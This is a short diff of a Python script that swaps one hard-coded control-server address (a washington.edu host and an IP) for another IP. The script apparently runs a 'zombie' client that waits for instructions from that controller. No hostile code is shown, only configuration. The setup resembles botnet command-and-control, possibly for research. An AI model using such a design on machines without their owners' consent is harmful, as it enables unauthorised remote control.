@@ -207,8 +207,7 @@ class waitForInstructions(threading.Thread):
         server.serve_forever()
 
 if __name__ == '__main__':
-    controlIP = "chunkeey.cs.washington.edu"
-    controlIP = "69.91.176.40"
+    controlIP = "173.250.173.50"
     zombieIP = socket.gethostbyname(socket.gethostname())
     controlPORT = 14000
     getInstrPORT = 15000
